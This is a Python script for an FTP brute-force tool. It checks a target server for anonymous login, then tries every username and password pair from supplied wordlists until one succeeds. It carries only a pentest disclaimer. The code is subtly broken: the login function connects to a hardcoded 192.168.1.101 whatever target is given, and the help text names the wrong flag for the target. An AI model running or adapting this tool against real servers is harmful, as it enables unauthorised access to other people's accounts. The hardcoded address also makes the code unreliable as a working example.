# -*- coding:utf-8 -*-

import sys
import os
import time
from ftplib import FTP


docs = """
        [*] This was written for educational purpose and pentest only. Use it at your own risk.
        [*] Author will be not responsible for any damage!
        [*] Toolname        : ftp_brute_laot.py
        [*] Coder           : 
        [*] Version         : 0.1
        [*] ample of use  : python ftp_brute_laot.py -t ftp.server.com -u usernames.txt -p passwords.txt
        """

if sys.platform == 'linux' or sys.platform == 'linux2':
    clearing = 'clear'
else:
    clearing = 'cls'
os.system(clearing)

R = "\033[31m"
G = "\033[32m"
Y = "\033[33m"
END = "\033[0m"


def logo():
    print(G + "\n                |---------------------------------------------------------------|")
    print("                |                                                               |")
    print("                |                           www.ixysec.com                      |")
    print("                |                11/07/2018 ftp_brute_laot.py v.0.1             |")
    print("                |                        FTP Brute Forcing Tool                 |")
    print("                |                                                               |")
    print("                |---------------------------------------------------------------|\n")
    print("        \n                 [-] %s\n" % time.strftime("%X"))
    print(docs + END)

def xhelp():
    print(R + "[*]-t, --target            ip/hostname     <> Our target")
    print("[*]-u, --usernamelist      usernamelist    <> usernamelist path")
    print("[*]-p, --passwordlist      passwordlist    <> passwordlist path")
    print("[*]-h, --help              help            <> print this help")
    print("[*]Example : python ftp_bf -h ftp.server.com -u username.txt -p passwords.txt" + END)
    sys.exit(1)

def brute_login(host, user, pwd):
    try:
        ftp = FTP("192.168.1.101")
        ftp.login(user, pwd)
        ftp.retrlines('list')
        ftp.quit()
        print(Y + "\n[!] w00t,w00t!!! We did it ! ")
        print("[+] Target : ", host, "")
        print("[+] User : ", user, "")
        print("[+] Password : ", pwd, "" + END)
        return 1
    except Exception:
        pass
    except KeyboardInterrupt:
        print(R + "\n[-] Exiting ...\n" + END)
        sys.exit(1)

def anonymous_login(host):
    try:
        print(G + "\n[!] Checking for anonymous login.\n" + END)
        ftp = FTP(host)
        ftp.login()
        ftp.retrlines("list")
        print(Y + "\n[!] w00t,w00t!!! Anonymous login successfuly !\n" + END)
        sys.exit(0)
    except Exception:
        print(R + "\n[-] Anonymous login failed...\n" + END)


def main():
    logo()
    # ftp_brute.py -h 127.0.0.1 -p password.txt -u username.txt
    # ['ftp_brute.py', '-h', '127.0.0.1', '-p', 'password.txt', '-u', 'username.txt']
    # print(sys.argv)
    try:
        for argv in sys.argv:
            if argv.lower() == "-t" or argv.lower() == "--target":
                host = sys.argv[sys.argv.index(argv) + 1]
                # print(host)
            elif argv.lower() == "-u" or argv.lower() == "--usernamelist":
                usernamelist = sys.argv[sys.argv.index(argv) + 1]
                # print(usernamelist)
            elif argv.lower() == "-p" or argv.lower() == "--passwordlist":
                passwordlist = sys.argv[sys.argv.index(argv) + 1]
                # print(passwordlist)
            elif argv.lower() == "-h" or argv.lower() == "--help":
                xhelp()
            elif len(sys.argv) <= 1:
                xhelp()
    except SystemExit:
        print(R+"[-]Cheak your parametars input\n"+END)
        sys.exit(0)
    except Exception:
        xhelp()
        print(R+"[-]Cheak your parametars input\n"+END)

    print(G + "[!] BruteForcing target ..." + END)
    anonymous_login(host)

    try:
        usernames = open(usernamelist, "r")
        user = usernames.readlines()
        for i in range(len(user)):
            user[i] = user[i].strip()
    except Exception:
        print(R + "\n[-] Cheak your usernamelist path\n" + END)
        sys.exit(1)

    try:
        passwords = open(passwordlist, "r")
        pwd = passwords.readlines()
        for i in range(len(pwd)):
            pwd[i] = pwd[i].strip()
    except Exception:
        print(R + "\n[-] Cheak your passwordlist path\n" + END)
        sys.exit(1)

    print(G + "\n[+] Loaded:", len(user), "usernames")
    print("\n[+] Loaded:", len(pwd), "passwords")
    print("[+] Target:", host)
    print("[+] Guessing...\n" + END)

    flag = 0
    for u in user:
        if flag == 0:
            for p in pwd:
                result = brute_login(host, u.replace("\n", ""), p.replace("\n", ""))
                if result != 1:
                    print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + R + "Disenable" + END)
                else:
                    print(G + "[+]Attempt uaername:%s password:%s..." % (u, p) + Y + "Enable" + END)
                    flag = 1
                    break
        else:
            break
    if not result:
        print(R + "\n[-]There is no username ans password enabled in the list.")
        print("[-]Exiting...\n" + END)

if __name__ == "__main__":
    main()

